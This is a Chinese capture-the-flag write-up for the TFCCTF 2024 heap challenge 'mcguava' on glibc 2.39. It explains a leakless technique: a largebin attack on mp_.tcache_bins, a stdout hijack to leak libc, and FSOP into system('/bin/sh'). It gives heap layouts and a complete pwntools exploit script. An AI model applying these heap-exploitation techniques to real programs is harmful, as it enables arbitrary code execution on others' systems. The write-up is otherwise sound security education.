# TFCCTF2024 pwn - mcguava 非预期：新的 leakless rce 技巧-先知社区

> **来源**: https://xz.aliyun.com/news/19352  
> **文章ID**: 19352

---

## 前言

7解困难pwn题，网上能搜到的解法均是通过house of water完成的，这里介绍另一个更优雅的非预期解法，glibc高版本均可用，本例是2.39版本下

## 新的 leakless rce技巧思路 & 与经典 house of water 的区别

一个经典的leakless技巧 house of water，是通过申请不同大小的chunk，在`tcache_perthread_struct`​中伪造出 fake chunk header，通过精准的堆风水布局之后，让这个伪造的chunk被合并到 unsortedbin 中，从而使得`tcache_perthread_struct`里出现了libc地址，也就是arena中的地址，可以通过相对偏移修改最低2字节指向stdout，修改stdout的值泄露地址，修改stdout的值来通过FSOP完成RCE

这里要用一个新的技巧，基于mp\_的leakless技巧，与house of water不同，这里通过largebin attack打mp\_->tcache\_bins变量，让更大范围的chunk都被认为是tcache chunk，需要提前布局stdout的指针在堆上，通过分配相应大小的chunk，从而直接分配走stdout的地址，修改stdout泄露libc地址，通过FSOP完成RCE

堆上可以很方便出现unsortedbin 的 arena地址，通过局部覆盖，可以使其指向stdout和mp\_变量，概率和house of water相同，都是1/16

**在当前题目场景下相比house of water技巧，只需要极少次数的内存分配即可完成全部流程**

前置条件：

* 需要能分配内存，能写入数据，进行局部覆盖
* 能够释放内存
* 能促成进行**largebin attack**的漏洞（UAF，Double-Free，boa等）

流程大致如下：

* 在堆上布局libc地址，局部覆盖地址指向stdout
* largebin attack，攻击mp\_.tcache\_bins变量，写入堆地址
* 分配内存，将之前在堆上布局的stdout的地址作为tcache chunk分配出去进行修改，泄露libc地址
* fsop

本例另一个关键的难点在于，如何精细控制堆布局为largebin attack准备条件。

## 题目情况

题目来源：TFCCTF 2024，困难 pwn，保护全开，glibc版本2.39

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

## 逆向分析

程序逻辑极其简单，main：

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int opt; // [rsp+0h] [rbp-10h] BYREF
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  for ( i = 0; i <= 255; ++i )
    guava_gius[i] = 0;
  banner();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &opt);
    if ( opt == 3 )
      exit(0);
    if ( opt > 3 )
    {
LABEL_13:
      puts("invalid choice");
    }
    else if ( opt == 1 )
    {
      guava();                                  // 申请，写入内容，无溢出
    }
    else
    {
      if ( opt != 2 )
        goto LABEL_13;
      gius();                                   // 释放，不清空指针
    }
  }
}
```

菜单题，总共就2个选项，一个是add，一个是delete

guava：add，申请内存，并向其中指定偏移处写入数据，申请最大0x6ff，存入全局变量数组中，数组最大数量是255

```
unsigned __int64 guava()
{
  int v0; // eax
  int size; // [rsp+8h] [rbp-18h] BYREF
  int size2; // [rsp+Ch] [rbp-14h] BYREF
  char *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( cnt_guavas > 255 )
  {
    puts("guava overload");
    exit(0);
  }
  printf("how many guavas: ");
  __isoc99_scanf("%d", &size);
  if ( size > 0x6FF )                           // 最大0x6ff
  {
    puts("guava overload");
    exit(0);
  }
  ptr = (char *)malloc(size);
  printf("guavset: ");
  __isoc99_scanf("%d", &size2);
  if ( size2 < 0 || size - 2 <= size2 )         // 需要 size-2 > size2 > 0
  {
    puts("guava overload");
    exit(0);
  }
  printf("guavas: ");
  read(0, &ptr[size2], size - size2);           // size-size2至少是2，读取个差值，从size2索引处读取
                                                // 对于largebin chunk，可直接修改nextsize->bk
  v0 = cnt_guavas++;
  guava_gius[v0] = ptr;                         // 有全局数组
  return v5 - __readfsqword(0x28u);
}
```

gius：delete，不清空指针，意味着潜在的双重释放，和总共255次的分配次数上限

```
unsigned __int64 gius()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("guava no: ");
  __isoc99_scanf("%d", &idx);
  if ( idx >= 0x100 )
  {
    puts("guava overload");
    exit(0);
  }
  free((void *)guava_gius[idx]);                // 没清空指针
  return v2 - __readfsqword(0x28u);
}
```

## 利用分析

程序使用glibc-2.39版本，存在指针tcache加密，无hook指针可用

程序存在的问题是释放内存后指针没有清空，可能导致UAF或者Double-Free

程序可以申请内存，最大是0x6ff，可以向任意偏移处写入数据，不存在溢出

没有打印功能，无法泄露地址

### 地址需要爆破场景下的调试技巧

开始之前介绍一下关键的调试技巧

对于这种1/16的地址爆破，在调试阶段我们并不希望手动爆破到地址之后再进行后续的利用分析，所以最好能禁用ASLR来排除干扰，同时也不希望禁用系统的aslr，这就可以通过setarch命令来完成针对单一命令的禁用

以禁用aslr方式启动 sh 终端，由该 sh 启动的所有进程都会禁用 aslr（我这里用的是zsh）

```
setarch $(uname -m) -R zsh
```

### 布局2个 stdout 指针

提前布局指针，为了完成申请走stdout，需要提前在堆上布局，为了方便计算，最好能在最前面布局stdout指针：

mp\_和stdout地址和arena地址很近，覆盖2字节，需要爆破半个字节，1/16 的概率对上

```
mp_ = 0xe180
stdout_ = 0xf5c0

# 准备两个指向stdout的指针
target = add(0x6f8,0,b"reserved") # reserved for ovf tcache entry later
add(0x18,0,b"aaa") 
dele(target)

target1 = add(0x18,0,p16(stdout_))
target2 = add(0x6f8-0x20,0,p16(stdout_))
```

```
0x55555555a290  0x0000000000000000      0x0000000000000021      ........!.......
0x55555555a2a0  0x00007ffff7faf5c0      0x00007ffff7faefd0      ................

0x55555555a2b0  0x000055555555a290      0x00000000000006e1      ..UUUU..........
0x55555555a2c0  0x00007ffff7faf5c0      0x00007ffff7faeb20      ........ .......
0x55555555a2d0  0x0000000000000000      0x0000000000000000      ................
...
pwndbg> p stdout
$2 = (FILE *) 0x7ffff7faf5c0 <_IO_2_1_stdout_>
```

这里为了后面布局方便，直接把 unsortedbin 申请走

### Heap Fengshui：创造重叠块（难点）

下一步：为largebin attack做准备

在2.31之后，largebin attack需要修改nextsize->bk字段为目标地址-0x20，我们的目标地址是mp\_结构体，所以需要让arena地址出现在largebin的nextsize\_bk字段且部分覆盖后2字节指向mp\_中我们想要控制的部分

那么，接下来我们就需要搞出1个 largebin chunk，在其+0x10处重叠一个unsortedbin chunk

这里有2个思路：

1. 要么让largebin chunk 被大的unsortedbin chunk包裹,通过申请内存触发分割 -> 需要精准布局
2. 要么在largebin chunk+0x10处伪造chunk header,触发下面unsortedbin chunk consolidation -> 需要绕过双链完整性检查

显然，我们没有任何地址泄露，完成2很艰难，所以选择思路1

首先第一步：纯 UAF 创造重叠块

```
# heap FengShui
idxs = []
for i in range(16):
    idxs.append(add(0xf8,0,b"filler"))

add(0x18,0,b"barrier")
la_u = add(0x418,0,b"component")    # largebin attack unsortedbin chunk component
add(0x18,0,b"a")

for i in range(16):
    dele(idxs[i])
```

0x100的chunk大量申请，然后按顺序释放，我就可以得到一个大chunk进入unsortedbin

我计划使用0x420和0x430的chunk进行largebin attack，所以这里预埋一个0x420的chunk在时机成熟的时候释放掉使其进入unsortedbin为largebin attack做准备

接下来这里通过计算size，申请出一个将要用于0x430 largebin chunk的指针：

```
padding = add(0x4c8-0x20,0,b"f")
large = add(0x428+0x20,0,b"1")
dele(large)
dele(padding)
```

这里为什么要加0x20？因为释放0x430的chunk到unsortedbin中，会进行合并检查，合并检查会向后检查next chunk是否被释放，就会再向后检查一个chunk的prev\_inuse是否设置

这里需要通过原本0x100的chunk的指针去操纵这个large指针所作chunk的大小为0x430，并且伪造nextchunk和next nextchunk：

```
# forge fake nextchunk
add(0xf8,0,b"a")
dele(idxs[-1])
add(0xf8,0xd0,pack(0x430)+pack(0x11)+pack(0x440)+pack(0x11))

# forge fake largebin chunk size
add(0xf8,0,"a")
dele(idxs[11])
add(0xf8,0xa8,pack(0x431)+pack(0)*2)
```

最终得到如下内存布局：

```
0x55555555b540  0x0000000000000400      0x0000000000000100      ................	0x100 tcache chunk
0x55555555b550  0x000055500000fb0b      0x0000000000000000      ....PU..........
0x55555555b560  0x0000000000000000      0x0000000000000000      ................
0x55555555b570  0x0000000000000000      0x0000000000000000      ................
0x55555555b580  0x0000000000000000      0x0000000000000000      ................
0x55555555b590  0x0000000000000000      0x0000000000000000      ................
0x55555555b5a0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5b0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5c0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5d0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5e0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5f0  0x0000000000000000      0x0000000000000431      ........1.......	large ptr
0x55555555b600  0x0000000000000000      0x0000000000000000      ................
0x55555555b610  0x0000000000000000      0x0000000000000000      ................
0x55555555b620  0x0000000000000000      0x0000000000000000      ................
0x55555555b630  0x0000000000000000      0x0000000000000000      ................
...
0x55555555b640  0x0000000000000500      0x0000000000000100      ................
0x55555555b650  0x000072656c6c6966      0x0000000000000000      filler..........
0x55555555b660  0x0000000000000000      0x0000000000000000      ................
0x55555555ba10  0x0000000000000000      0x0000000000000000      ................
0x55555555ba20  0x0000000000000430      0x0000000000000011      0...............
0x55555555ba30  0x0000000000000440      0x0000000000000011      @...............
0x55555555ba40  0x0000000000000900      0x0000000000000020      ........ .......
```

完成布局后，就能将0x430的chunk释放在一个大的unsortedbin里，重叠unsortedbin chunk

接下来，申请合适size的chunk，让新的chunk位于largebin size chunk+0x10的位置：

```
0x55555555b540  0x0000000000000400      0x0000000000000100      ................
0x55555555b550  0x000055500000fb0b      0x0000000000000000      ....PU..........
0x55555555b560  0x0000000000000000      0x0000000000000000      ................
0x55555555b570  0x0000000000000000      0x0000000000000000      ................
0x55555555b580  0x0000000000000000      0x0000000000000000      ................
0x55555555b590  0x0000000000000000      0x0000000000000000      ................
0x55555555b5a0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5b0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5c0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5d0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5e0  0x0000000000000000      0x0000000000000000      ................
0x55555555b5f0  0x0000000000000000      0x0000000000000431      ........1.......         <-- largebins[0x0][0]
0x55555555b600  0x00007ffff7faef10      0x0000000000000441      ........A.......
0x55555555b610  0x00007ffff7faeb20      0x00007ffff7faeb20       ....... .......
0x55555555b620  0x0000000000000000      0x0000000000000000      ................
0x55555555b630  0x0000000000000032      0x0000000000000000      2...............

0x55555555b640  0x0000000000000500      0x0000000000000100      ................
0x55555555b650  0x000072656c6c6966      0x0000000000000000      filler..........
0x55555555b660  0x0000000000000000      0x0000000000000000      ................
...
0x55555555b9d0  0x0000000000000000      0x0000000000000000      ................
0x55555555b9e0  0x0000000000000000      0x0000000000000000      ................
0x55555555b9f0  0x0000000000000000      0x0000000000000000      ................
0x55555555ba00  0x0000000000000000      0x0000000000000000      ................
0x55555555ba10  0x0000000000000000      0x0000000000000000      ................
0x55555555ba20  0x0000000000000430      0x0000000000000010      0...............
0x55555555ba30  0x0000000000000440      0x0000000000000011      @...............
0x55555555ba40  0x0000000000000440      0x0000000000000021      @.......!.......
0x55555555ba50  0x0072656972726162      0x0000000000000000      barrier.........
```

自此，完成largebin chunk的准备，接下来释放0x420的unsortedbin chunk，以及修改nextsize\_bk指向目标即可

### largebin attack 打 mp\_ 结构体（技巧要点）

mp\_结构体的值如下：

```
pwndbg> mp
mp_ struct at: 0x7ffff7fae180
{
  trim_threshold = 131072,
  top_pad = 131072,
  mmap_threshold = 131072,
  arena_test = 8,
  arena_max = 0,
  thp_pagesize = 0,
  hp_pagesize = 0,
  hp_flags = 0,
  n_mmaps = 0,
  n_mmaps_max = 65536,
  max_n_mmaps = 0,
  no_dyn_threshold = 0,
  mmapped_mem = 0,
  max_mmapped_mem = 0,
  sbrk_base = 0x55555555a000 "",
  tcache_bins = 64,
  tcache_max_bytes = 1032,
  tcache_count = 7,
  tcache_unsorted_limit = 0
}
```

该结构体和arena距离比较近，通过爆破16位，就可以指向这里

largebin attack的主要作用是向任意地址写入堆地址

本技巧的目标就是mp\_->tcache\_bins，这个变量决定tcache索引上限，修改此值为超大值后，即使是超出正常size范围的tcache，也会被当成tcache处理

```
# get 0x418 size unsortedbin chunk
dele(la_u)

# set largebin chunk->nextsize_bk 2byte
dele(idxs[11])
add(0xf8,0xa8+0x20,p16(mp_ + 0x68 - 0x20))  # mp_->tcache_bins 

# trigger largebin attack
add(0x6f0,0,b"111")
```

修改后的mp：

```
pwndbg> mp
mp_ struct at: 0x7ffff7fae180
{
  trim_threshold = 131072,
  top_pad = 131072,
  mmap_threshold = 131072,
  arena_test = 8,
  arena_max = 0,
  thp_pagesize = 0,
  hp_pagesize = 0,
  hp_flags = 0,
  n_mmaps = 0,
  n_mmaps_max = 65536,
  max_n_mmaps = 0,
  no_dyn_threshold = 0,
  mmapped_mem = 0,
  max_mmapped_mem = 0,
  sbrk_base = 0x55555555a000 "",
  tcache_bins = 93824992262752,
  tcache_max_bytes = 1032,
  tcache_count = 7,
  tcache_unsorted_limit = 0
}
```

接下来就是计算偏移利用tcache去写stdout了

### 利用 stdout 变量泄露 libc 地址

我们在之前的代码里添加一些申请地址的操作，然后在这里释放掉，为新的tcache\_count赋值：

```
# 为后续tcache结构发生变化提前准备count字段
res1 = add(0x18,0,b"1")
res2 = add(0x28,0,b"2")
res3 = add(0x38,0,b"3")

...
dele(res1)
dele(res2)
dele(res3)
```

之前让提前布局的stdout地址位于堆开头的地方，计算偏移知道其对应的大小，分别是0x440和0x480，通过申请0x438和0x478的内存来触发

通过释放之前申请的0x18，0x28，0x38的chunk来让新的size chunk的count的值不为0，即可向stdout写入数据

需要使其打印数据出来，就需要修改其flags字段的值和write\_base：

```
dele(res1)
dele(res2)
dele(res3)

# 对应tcache的 0x438 0x478
add(0x438,0,pack(0xfbad1800)+pack(0)*3+p8(0))
leak = r(8)
leak = unpack(leak)
libc.address = leak-0x204644
success(f"libc address => {hex(libc.address)}")
```

默认情况下，stdout的flags的值是0xfbad2887，将其修改为0xfbad1800，即可立即输出缓冲区的内容

对于后2字节标志的作用对比：

|  |  |  |  |  |
| --- | --- | --- | --- | --- |
| **标志位 (Flag Name)** | **值 (Hex)** | **0x1800 (常规)** | **0x2887 (利用)** | **描述** |
| ​`_IO_IS_FILEBUF` | ​`0x2000` | 否 | **是** | 这是一个文件缓冲区 (filebuf)，非字符串 (strbuf)。 |
| ​`_IO_IS_APPENDING` | ​`0x1000` | **是** | 否 | 流处于追加模式 (Append mode)。 |
| ​`_IO_CURRENTLY_PUTTING` | ​`0x0800` | **是** | **是** | 流当前正在进行“输出”操作。 |
| ​`_IO_USER_BUF` | ​`0x0080` | 否 | **是** | 缓冲区由用户提供 (非`malloc`分配)。 |
| ​`_IO_WRITE_ALLOWED` | ​`0x0004` | 否 | **是** | 允许写入。 |
| ​`_IO_UNBUFFERED` | ​`0x0002` | 否 | **是** | **流是无缓冲的 (Unbuffered)。** |
| ​`_IO_READ_ALLOWED` | ​`0x0001` | 否 | **是** | 允许读取。 |

**最关键的就是有没有0x1000这个位，0x3887也是可以的**

### house of emma + house of cat 组合利用 + IO Struct 构造

第二次写入stdout，直接在stdout伪造IO结构，利用puts的`_IO_sputn`调用进行触发

借用house of emma通过偏移vtable指针，使其调用到其他虚表绕过调用检查的思想

house of cat 的利用链：`__GI__IO_wfile_seekoff -> __GI__IO_switch_to_wget_mode -> [rax + 0x18]`

在`__GI__IO_wfile_seekoff`中：

```
Dump of assembler code for function __GI__IO_wfile_seekoff:
   0x00007ffff7e38270 <+0>:     endbr64
   0x00007ffff7e38274 <+4>:     push   rbp
   0x00007ffff7e38275 <+5>:     mov    rbp,rsp
   0x00007ffff7e38278 <+8>:     push   r15
   0x00007ffff7e3827a <+10>:    push   r14
   0x00007ffff7e3827c <+12>:    push   r13
   0x00007ffff7e3827e <+14>:    mov    r13,rdi
   0x00007ffff7e38281 <+17>:    push   r12
   0x00007ffff7e38283 <+19>:    push   rbx
   0x00007ffff7e38284 <+20>:    sub    rsp,0xd8
   0x00007ffff7e3828b <+27>:    mov    rax,QWORD PTR fs:0x28
   0x00007ffff7e38294 <+36>:    mov    QWORD PTR [rbp-0x38],rax
   0x00007ffff7e38298 <+40>:    mov    rax,QWORD PTR [rdi+0xa0]
   0x00007ffff7e3829f <+47>:    test   ecx,ecx
   0x00007ffff7e382a1 <+49>:    je     0x7ffff7e386a0 <__GI__IO_wfile_seekoff+1072>
   0x00007ffff7e382a7 <+55>:    mov    r12d,edx
   0x00007ffff7e382aa <+58>:    mov    rcx,QWORD PTR [rax+0x18]
   0x00007ffff7e382ae <+62>:    mov    rdx,QWORD PTR [rax+0x20]
   0x00007ffff7e382b2 <+66>:    mov    rbx,rsi
   0x00007ffff7e382b5 <+69>:    mov    rdi,QWORD PTR [rax+0x8]
   0x00007ffff7e382b9 <+73>:    xor    r15d,r15d
   0x00007ffff7e382bc <+76>:    cmp    QWORD PTR [rax+0x10],rdi
   0x00007ffff7e382c0 <+80>:    je     0x7ffff7e38690 <__GI__IO_wfile_seekoff+1056>
   0x00007ffff7e382c6 <+86>:    cmp    rcx,rdx
   0x00007ffff7e382c9 <+89>:    jb     0x7ffff7e382d5 <__GI__IO_wfile_seekoff+101>
   0x00007ffff7e382cb <+91>:    test   DWORD PTR [r13+0x0],0x800
   0x00007ffff7e382d3 <+99>:    je     0x7ffff7e382ec <__GI__IO_wfile_seekoff+124>
   0x00007ffff7e382d5 <+101>:   mov    rdi,r13
   0x00007ffff7e382d8 <+104>:   call   0x7ffff7e35fa0 <__GI__IO_switch_to_wget_mode>
```

rdi 是 stdout 指针，保存到r13，在进入`__GI__IO_switch_to_wget_mode`的时候又取回

这里只要确保满足`write_base < write_ptr`​即可进入`__GI__IO_switch_to_wget_mode`：

```
Dump of assembler code for function __GI__IO_switch_to_wget_mode:
   0x00007ffff7e35fa0 <+0>:     endbr64
   0x00007ffff7e35fa4 <+4>:     push   rbp
   0x00007ffff7e35fa5 <+5>:     mov    rbp,rsp
   0x00007ffff7e35fa8 <+8>:     push   rbx
   0x00007ffff7e35fa9 <+9>:     mov    rbx,rdi
   0x00007ffff7e35fac <+12>:    sub    rsp,0x8
   0x00007ffff7e35fb0 <+16>:    mov    rax,QWORD PTR [rdi+0xa0]
   0x00007ffff7e35fb7 <+23>:    mov    rdx,QWORD PTR [rax+0x20]
   0x00007ffff7e35fbb <+27>:    cmp    QWORD PTR [rax+0x18],rdx
   0x00007ffff7e35fbf <+31>:    jae    0x7ffff7e35fe0 <__GI__IO_switch_to_wget_mode+64>
   0x00007ffff7e35fc1 <+33>:    mov    rax,QWORD PTR [rax+0xe0]
   0x00007ffff7e35fc8 <+40>:    mov    esi,0xffffffff
   0x00007ffff7e35fcd <+45>:    call   QWORD PTR [rax+0x18]
```

rax的值来自`[stdout + 0xa0] + 0xe0]`​，取其中`+0x18`位置

只需要将`+0xa0`​和`+0xe0`​这两个地方设置为`stdout`​，那么只需要在`stdout + 0x18`​处写入目标函数地址即可，此时，rdi指向`stdout+0`

为了满足`write_base < write_ptr`​，在`+0x20`处写入一个很大的值就行

fake IO结构如下：

```
fp = libc.sym._IO_2_1_stdout_
io_payload = flat({
    0x00:b"/bin/sh\x00",
    0x18:pack(libc.sym.system),           		# read_base   
    0x20:pack(fp),           					# write_base     _wide_data.write_base
    0x88:pack(fp+8) ,        					# lock
    0xa0:pack(fp),           					# _wide_data
    0xc0:pack(0),                               # mode
    0xd8:pack(libc.sym._IO_wfile_jumps+0x10),   # vtable
    0xe0:pack(fp),                              # _wide_vtable
},filler=b"\x00")
```

## 完整exp

```
#!/usr/bin/env python3

from pwn import *
context.arch="amd64"
io = process("./guava")
#io = remote("",)
libc = ELF("libc.so.6")

r   = lambda x    : io.recv(numb=x)
ru  = lambda x    : io.recvuntil(x)
rl  = lambda      : io.recvline()
s  = lambda x    : io.send(x)
sl  = lambda x    : io.sendline(x)
ia  = lambda      : io.interactive()
sla = lambda a, b : io.sendlineafter(a, b)
sa  = lambda a, b : io.sendafter(a, b)

idx = 0

def cmd(i, prompt=b"*> "):
    sla(prompt, i)

def add(sz:int,offset:int,data:bytes):
    cmd('1')
    sla(b"how many guavas: ",str(sz).encode())
    sla(b"guavset: ",str(offset).encode())
    sa(b"guavas: ",data)
    
    global idx
    out = idx
    idx += 1
    return out
    
def dele(idx:int):
    cmd('2')
    sla(b"guava no: ",str(idx).encode())

mp_ = 0xe180
stdout_ = 0xf5c0


target = add(0x6f8,0,b"reserved") # reserved for ovf tcache entry later
add(0x18,0,b"aaa") 
dele(target)
target1 = add(0x18,0,p16(stdout_))
target2 = add(0x6f8-0x20,0,p16(stdout_))

# 为后续tcache结构发生变化提前准备count字段
res1 = add(0x18,0,b"1")
res2 = add(0x28,0,b"2")
res3 = add(0x38,0,b"3")

# heap FengShui
idxs = []
for i in range(16):
    idxs.append(add(0xf8,0,b"filler"))

add(0x18,0,b"barrier")
la_u = add(0x418,0,b"component")    # largebin attack unsortedbin chunk component
add(0x18,0,b"a")

for i in range(16):
    dele(idxs[i])

# get a largebin chunk size ptr & forge fake chunk    
padding = add(0x4c8-0x20,0,b"f")
large = add(0x428+0x20,0,b"1")
dele(large)
dele(padding)

# forge fake nextchunk
add(0xf8,0,b"a")
dele(idxs[-1])
add(0xf8,0xd0,pack(0x430)+pack(0x11)+pack(0x440)+pack(0x11))

# forge fake largebin chunk size
add(0xf8,0,"a")
dele(idxs[11])
add(0xf8,0xa8,pack(0x431)+pack(0)*2)
# get 0x428 unsortedbin chunk
dele(large)

# trigger sorting -> get 0x428 largebin size chunk
tmp = add(0x438+0x80,0,b"1")
tmp2 =add(0x438,0x20,b"2")

# get 0x418 size unsortedbin chunk
dele(la_u)

# set largebin chunk->nextsize_bk 2byte
dele(idxs[11])
add(0xf8,0xa8+0x20,p16(mp_ + 0x68 - 0x20))  # mp_->tcache_bins 

# trigger largebin attack
add(0x6f0,0,b"111")

dele(res1)
dele(res2)
dele(res3)

# 对应tcache的 0x438 0x478
add(0x438,0,pack(0xfbad3887)+pack(0)*3+p8(0))
leak = r(8)
leak = unpack(leak)
libc.address = leak-0x204644
success(f"libc address => {hex(libc.address)}")


fp = libc.sym._IO_2_1_stdout_
io_payload = flat({
    0x00:b"/bin/sh\x00",
    0x18:pack(libc.sym.system),           # read_base   
    0x20:pack(fp),           # write_base     _wide_data.write_base
    0x88:pack(fp+8) ,        # lock
    0xa0:pack(fp),           # _wide_data
    0xc0:pack(0),                               # mode
    0xd8:pack(libc.sym._IO_wfile_jumps+0x10),   # vtable
    0xe0:pack(fp),                              # _wide_vtable
},filler=b"\x00")

add(0x478,0,io_payload)

ia()
```

## 总结

为 leakless 场景下，又添一技巧

## 参考资料

* glibc 2.39 源码
* [堆利用详解：house of cat（含 2.35 &amp; 2.39 IO伪造过程分析）-先知社区](https://xz.aliyun.com/news/15379)
* [2025 强网杯S9 pwn - bph 复盘详解：一个任意地址写00到RCE的新技巧-先知社区](https://xz.aliyun.com/news/19258)
* [我可是会飞的啊](https://www.kn0sky.com/)

‍
